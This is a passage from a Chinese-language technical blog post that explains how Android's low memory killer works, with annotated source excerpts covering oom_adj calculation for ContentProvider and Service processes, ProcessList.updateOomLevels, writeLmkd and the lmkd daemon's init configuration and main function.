&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>以上就是计算含有 Service 进程的 oom_adj 的全部过程。从代码上看进程仅含有 Unbounded Service 时，整个计算过程比较简单，只要进程没有显示 UI 且 Service 的存在没有超时时，进程的 oom_adj 就被调整为 SERVICE_ADJ。当进程含有 Bounded Service 时，整个计算的复杂度就大大提高，它将考虑到 Bound 使用 flag 以及客户端的情况，综合调整进程的 oom_adj。</p><p>4.6 这部分代码主要是用来处理含有 ContentProvider 的进程。由于 ContentProvider 也有客户端，因此同样需要根据客户端进程调整到当前进程的 oom_adj。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//依次处理进程中的ContentProvider</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> provi = app.pubProviders.size()<span class="number">-1</span>;</span><br><span class="line">                provi &gt;= <span class="number">0</span> &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">                        || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND</span><br><span class="line">                        || procState &gt; ActivityManager.PROCESS_STATE_TOP);</span><br><span class="line">                provi--) &#123;</span><br><span class="line">    ContentProviderRecord cpr = app.pubProviders.valueAt(provi);</span><br><span class="line">    <span class="comment">//依次处理ContentProvider的客户端</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = cpr.connections.size()<span class="number">-1</span>;</span><br><span class="line">            i &gt;= <span class="number">0</span> &amp;&amp; (adj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">                    || schedGroup == ProcessList.SCHED_GROUP_BACKGROUND</span><br><span class="line">                    || procState &gt; ActivityManager.PROCESS_STATE_TOP);</span><br><span class="line">            i--) &#123;</span><br><span class="line">        ContentProviderConnection conn = cpr.connections.get(i);</span><br><span class="line">        ProcessRecord client = conn.client;</span><br><span class="line">        <span class="keyword">if</span> (client == app) &#123;</span><br><span class="line">            <span class="comment">// Being our own client is not interesting.</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//计算客户端的oom_adj</span></span><br><span class="line">        <span class="type">int</span> clientAdj = computeOomAdjLocked(client, cachedAdj, TOP_APP, doingAll, now);</span><br><span class="line">        <span class="type">int</span> clientProcState = client.curProcState;</span><br><span class="line">        <span class="keyword">if</span> (clientProcState &gt;= ActivityManager.PROCESS_STATE_CACHED_ACTIVITY) &#123;        </span><br><span class="line">            clientProcState = ActivityManager.PROCESS_STATE_CACHED_EMPTY;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//与Unbounded Service的处理基本类似</span></span><br><span class="line">        <span class="keyword">if</span> (adj &gt; clientAdj) &#123;</span><br><span class="line">            <span class="keyword">if</span> (app.hasShownUi &amp;&amp; app != mHomeProcess</span><br><span class="line">                    &amp;&amp; clientAdj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                app.adjType = <span class="string">&quot;cch-ui-provider&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//根据clientAdj，调整当前进程的adj</span></span><br><span class="line">                adj = clientAdj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">                        ? clientAdj : ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">                        app.adjType = <span class="string">&quot;provider&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//调整其它变量</span></span><br><span class="line">            app.cached &amp;= client.cached;</span><br><span class="line">            app.adjTypeCode = ActivityManager.RunningAppProcessInfo</span><br><span class="line">                    .REASON_PROVIDER_IN_USE;</span><br><span class="line">            app.adjSource = client;</span><br><span class="line">            app.adjSourceProcState = clientProcState;</span><br><span class="line">            app.adjTarget = cpr.name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进一步调整调度策略和procState</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//特殊情况的处理</span></span><br><span class="line">        <span class="keyword">if</span> (cpr.hasExternalProcessHandles()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.FOREGROUND_APP_ADJ) &#123;</span><br><span class="line">                adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">                schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">                app.cached = <span class="literal">false</span>;</span><br><span class="line">                app.adjType = <span class="string">&quot;provider&quot;</span>;</span><br><span class="line">                app.adjTarget = cpr.name;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_IMPORTANT_FOREGROUND) &#123;</span><br><span class="line">                procState = ActivityManager.PROCESS_STATE_IMPORTANT_FOREGROUND;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果进程之前运行过ContentProvider，同时ContentProvider的存活时间没有超时</span></span><br><span class="line"><span class="comment">//那么进程的adj可以变为PREVIOUS_APP_ADJ</span></span><br><span class="line"><span class="keyword">if</span> (app.lastProviderTime &gt; <span class="number">0</span> &amp;&amp; (app.lastProviderTime+CONTENT_PROVIDER_RETAIN_TIME) &gt; now) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.PREVIOUS_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.PREVIOUS_APP_ADJ;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;provider&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>从代码上看，处理含有 ContentProvider 进程时，相对比较简单。基本上与处理含有 Unbounded Service 的进程一致，只是最后增加了一些特殊情况的处理。</p><p>4.7 这部分代码主要是针对 Service 进程作一些处理，同时判断的依据与前一次记录的 Service 进程总数有关。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据进程信息，进一步调整procState</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//对Service进程做一些特殊处理</span></span><br><span class="line"><span class="keyword">if</span> (adj == ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (doingAll) &#123;</span><br><span class="line">        <span class="comment">//每次updateOomAdj时，将mNewNumAServiceProcs置为0</span></span><br><span class="line">        <span class="comment">//然后LRU list中，从后往前数，前1/3的service进程就是AService</span></span><br><span class="line">        <span class="comment">//其余的就是bService</span></span><br><span class="line">        <span class="comment">//mNumServiceProcs为上一次update时，service进程的数量</span></span><br><span class="line">        app.serviceb = mNewNumAServiceProcs &gt; (mNumServiceProcs/<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//记录这一次update后，service进程的数量</span></span><br><span class="line">        <span class="comment">//update完毕后，该值将赋给mNumServiceProcs</span></span><br><span class="line">        mNewNumServiceProcs++;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!app.serviceb) &#123;</span><br><span class="line">            <span class="comment">// 如果不是bService，但内存回收等级过高，也被视为bService</span></span><br><span class="line">            <span class="keyword">if</span> (mLastMemoryLevel &gt; ProcessStats.ADJ_MEM_FACTOR_NORMAL</span><br><span class="line">                    &amp;&amp; app.lastPss &gt;= mProcessList.getCachedRestoreThresholdKb()) &#123;</span><br><span class="line">                app.serviceHighRam = <span class="literal">true</span>;</span><br><span class="line">                app.serviceb = <span class="literal">true</span>;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//LRU中后1/3的Service，都是AService</span></span><br><span class="line">                mNewNumAServiceProcs++;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            app.serviceHighRam = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将bService的oom_adj调整为SERVICE_B_ADJ</span></span><br><span class="line">    <span class="keyword">if</span> (app.serviceb) &#123;</span><br><span class="line">        adj = ProcessList.SERVICE_B_ADJ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算完毕</span></span><br><span class="line">app.curRawAdj = adj;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//if基本没有用，maxAdj已经是最大的UNKNOW_ADJ</span></span><br><span class="line"><span class="keyword">if</span> (adj &gt; app.maxAdj) &#123;</span><br><span class="line">    adj = app.maxAdj;</span><br><span class="line">    <span class="keyword">if</span> (app.maxAdj &lt;= ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//最后做一些记录和调整</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> app.curRawAdj;</span><br></pre></td></tr></table></figure><h2 id="二processlistjava"><a class="markdownIt-Anchor" href="#二processlistjava">#</a> （二）ProcessList.java</h2><h3 id="1-updataoomlevels方法"><a class="markdownIt-Anchor" href="#1-updataoomlevels方法">#</a> 1. updataOomLevels 方法</h3><p>updateOomLevels 方法只是简单的计算出 oomMinFree 数组的值和 oomAdj 值，然后通过 writeLmkd 将数据发送给 lmkd。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">private <span class="type">void</span> <span class="title function_">updateOomLevels</span><span class="params">(<span class="type">int</span> displayWidth, <span class="type">int</span> displayHeight, boolean write)</span> &#123;</span><br><span class="line">        <span class="comment">// 计算memory的scale数值</span></span><br><span class="line">        <span class="type">float</span> scaleMem = ((<span class="type">float</span>)(mTotalMemMb<span class="number">-350</span>))/(<span class="number">700</span><span class="number">-350</span>);</span><br><span class="line">        <span class="comment">// 计算显示屏的scale值</span></span><br><span class="line">        <span class="type">int</span> minSize = <span class="number">480</span>*<span class="number">800</span>;  <span class="comment">//  384000</span></span><br><span class="line">        <span class="type">int</span> maxSize = <span class="number">1280</span>*<span class="number">800</span>; <span class="comment">// 1024000  230400 870400  .264</span></span><br><span class="line">        <span class="type">float</span> scaleDisp = ((<span class="type">float</span>)(displayWidth*displayHeight)-minSize)/(maxSize-minSize);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">            Slog.i(<span class="string">&quot;XXXXXX&quot;</span>, <span class="string">&quot;scaleMem=&quot;</span> + scaleMem);</span><br><span class="line">            Slog.i(<span class="string">&quot;XXXXXX&quot;</span>, <span class="string">&quot;scaleDisp=&quot;</span> + scaleDisp + <span class="string">&quot; dw=&quot;</span> + displayWidth</span><br><span class="line">                    + <span class="string">&quot; dh=&quot;</span> + displayHeight);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//比较memory和显示屏scale值的大小，取较大值</span></span><br><span class="line">        <span class="type">float</span> scale = scaleMem &gt; scaleDisp ? scaleMem : scaleDisp;</span><br><span class="line">        <span class="keyword">if</span> (scale &lt; <span class="number">0</span>) scale = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (scale &gt; <span class="number">1</span>) scale = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> minfree_adj = Resources.getSystem().getInteger(</span><br><span class="line">    com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAdjust);</span><br><span class="line">        <span class="type">int</span> minfree_abs = Resources.getSystem().getInteger(</span><br><span class="line">                com.android.internal.R.integer.config_lowMemoryKillerMinFreeKbytesAbsolute);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">            Slog.i(<span class="string">&quot;XXXXXX&quot;</span>, <span class="string">&quot;minfree_adj=&quot;</span> + minfree_adj + <span class="string">&quot; minfree_abs=&quot;</span> + minfree_abs);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断是否为64位系统</span></span><br><span class="line">        final boolean is64bit = Build.SUPPORTED_64_BIT_ABIS.length &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//根据mOomMinFreeLow、mOomMinFreeHigh和scale值填充mOomMinFree数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;mOomAdj.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> low = mOomMinFreeLow[i];</span><br><span class="line">            <span class="type">int</span> high = mOomMinFreeHigh[i];</span><br><span class="line">            <span class="comment">//如果是64位系统，第四和第五级的数值会稍大一点</span></span><br><span class="line">            <span class="keyword">if</span> (is64bit) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">4</span>) high = (high*<span class="number">3</span>)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">5</span>) high = (high*<span class="number">7</span>)/<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mOomMinFree[i] = (<span class="type">int</span>)(low + ((high-low)*scale));</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        mCachedRestoreLevel = (getMemLevel(ProcessList.CACHED_APP_MAX_ADJ)/<span class="number">1024</span>) / <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> reserve = displayWidth * displayHeight * <span class="number">4</span> * <span class="number">3</span> / <span class="number">1024</span>;</span><br><span class="line">        <span class="type">int</span> reserve_adj = Resources.getSystem().getInteger(com.android.internal.R.integer.config_extraFreeKbytesAdjust);</span><br><span class="line">        <span class="type">int</span> reserve_abs = Resources.getSystem().getInteger(com.android.internal.R.integer.config_extraFreeKbytesAbsolute);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//如果需要写入则调用writelmkd将buf写入到lowmemoryKiller中</span></span><br><span class="line">        <span class="keyword">if</span> (write) &#123;</span><br><span class="line">            ByteBuffer buf = ByteBuffer.allocate(<span class="number">4</span> * (<span class="number">2</span>*mOomAdj.length + <span class="number">1</span>));</span><br><span class="line">            buf.putInt(LMK_TARGET);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;mOomAdj.length; i++) &#123;</span><br><span class="line">                buf.putInt((mOomMinFree[i]*<span class="number">1024</span>)/PAGE_SIZE);</span><br><span class="line">                buf.putInt(mOomAdj[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            writeLmkd(buf);</span><br><span class="line">            SystemProperties.<span class="built_in">set</span>(<span class="string">&quot;sys.sysctl.extra_free_kbytes&quot;</span>, Integer.toString(reserve));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// GB: 2048,3072,4096,6144,7168,8192</span></span><br><span class="line">        <span class="comment">// HC: 8192,10240,12288,14336,16384,20480</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="2-writelmkd方法"><a class="markdownIt-Anchor" href="#2-writelmkd方法">#</a> 2. writeLmkd 方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeLmkd</span><span class="params">(ByteBuffer buf)</span> &#123;</span><br><span class="line">        <span class="comment">//尝试打开lmkd socket端口</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sLmkdSocket == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (openLmkdSocket() == <span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//将数据写到socket端口中</span></span><br><span class="line">                sLmkdOutputStream.write(buf.array(), <span class="number">0</span>, buf.position());</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                Slog.w(TAG, <span class="string">&quot;Error writing to lowmemorykiller socket&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    sLmkdSocket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException ex2) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                sLmkdSocket = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">openLmkdSocket</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建本地socket句柄，尝试连接socket</span></span><br><span class="line">            sLmkdSocket = <span class="keyword">new</span> <span class="title class_">LocalSocket</span>(LocalSocket.SOCKET_SEQPACKET);</span><br><span class="line">            <span class="comment">//连接本地名为lmkd的本地socket</span></span><br><span class="line">            sLmkdSocket.connect(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LocalSocketAddress</span>(<span class="string">&quot;lmkd&quot;</span>,</span><br><span class="line">                        LocalSocketAddress.Namespace.RESERVED));</span><br><span class="line">            <span class="comment">//获取lmkd socket的输出流，用于向对端写入数据</span></span><br><span class="line">            sLmkdOutputStream = sLmkdSocket.getOutputStream();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            Slog.w(TAG, <span class="string">&quot;lowmemorykiller daemon socket open failed&quot;</span>);</span><br><span class="line">            sLmkdSocket = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="三lmkdcsystemcorelmkdlmkdc"><a class="markdownIt-Anchor" href="#三lmkdcsystemcorelmkdlmkdc">#</a> （三）lmkd.c（/system/core/lmkd/lmkd.c）</h2><p>lmk 与大多数守护进程一样，由 init 进程启动：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">service lmkd /system/bin/lmkd</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">core</span></span><br><span class="line">    user lmkd</span><br><span class="line">    group lmkd system readproc</span><br><span class="line">    capabilities DAC_OVERRIDE KILL IPC_LOCK SYS_NICE SYS_RESOURCE</span><br><span class="line">    critical</span><br><span class="line">    socket lmkd seqpacket+passcred <span class="number">0660</span> system system</span><br><span class="line">    writepid /dev/cpuset/system-background/tasks</span><br><span class="line"></span><br><span class="line">on property:lmkd.reinit=<span class="number">1</span></span><br><span class="line">    exec_background /system/bin/lmkd --reinit</span><br></pre></td></tr></table></figure><p>这里创建的 socket lmkd 的 user/group 都是 system，而它的权限是 0660，所以只有 system 应用才能读写（一般是 activity manager）。</p><h3 id="1-main函数"><a class="markdownIt-Anchor" href="#1-main函数">#</a> 1. main 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc __unused, <span class="type">char</span> **argv __unused)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_param</span> <span class="title">param</span> =</span> &#123; <span class="comment">//添加调度策略，即先进先出</span></span><br><span class="line">            .sched_priority = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    mlockall(MCL_FUTURE); <span class="comment">//给虚拟空间上锁，防止内存交换</span></span><br><span class="line">    sched_setscheduler(<span class="number">0</span>, SCHED_FIFO, &amp;param);</span><br><span class="line">    <span class="keyword">if</span> (!init()) <span class="comment">//init 处理所有核心的初始化工作</span></span><br><span class="line">        mainloop();</span><br><span class="line"></span><br><span class="line">    ALOGI(<span class="string">&quot;exiting&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//新版供对比</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    update_props(); <span class="comment">//step 1，进程最初，需要获取所有的lmkd 的prop，为init 做准备</span></span><br><span class="line"> </span><br><span class="line">    ctx = create_android_logger(KILLINFO_LOG_TAG);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!init()) &#123; <span class="comment">//step 2，init 处理所有核心的初始化工作</span></span><br><span class="line">        <span class="keyword">if</span> (!use_inkernel_interface) &#123; <span class="comment">//step 3，如果不再使用旧的LMK 驱动程序</span></span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">//step4, 给虚拟空间上锁，防止内存交换</span></span><br><span class="line">            <span class="keyword">if</span> (mlockall(MCL_CURRENT | MCL_FUTURE | MCL_ONFAULT) &amp;&amp; (errno != EINVAL)) &#123;</span><br><span class="line">                ALOGW(<span class="string">&quot;mlockall failed %s&quot;</span>, strerror(errno));</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//step 4，添加调度策略，即先进先出</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sched_param</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">                    .sched_priority = <span class="number">1</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (sched_setscheduler(<span class="number">0</span>, SCHED_FIFO, &amp;param)) &#123;</span><br><span class="line">                ALOGW(<span class="string">&quot;set SCHED_FIFO failed %s&quot;</span>, strerror(errno));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mainloop(); <span class="comment">//step 5， 进入循环，等待polling</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    android_log_destroy(&amp;ctx);</span><br><span class="line"> </span><br><span class="line">    ALOGI(<span class="string">&quot;exiting&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 shed_setscheduler () 中，设置此线程的调度策略为 SCHED_FIFO，即为先进先出；通过 SHED_FIFO 这种实时调度策略，优先级从 1 (low)-&gt;99（high）。param 中主要设置 sched_priority，实时线程通常比普通线程有更高的优先级。然后就调用 init 进行初始化，进入 mainloop () 中循环监听 socket。</p><p>在新版代码中可以看到 lmkd 的核心部分在 step2（init）和 step5（mainloop），之后将单独说明</p><p>这里需注意到 mlockall 函数，在新的 LMK 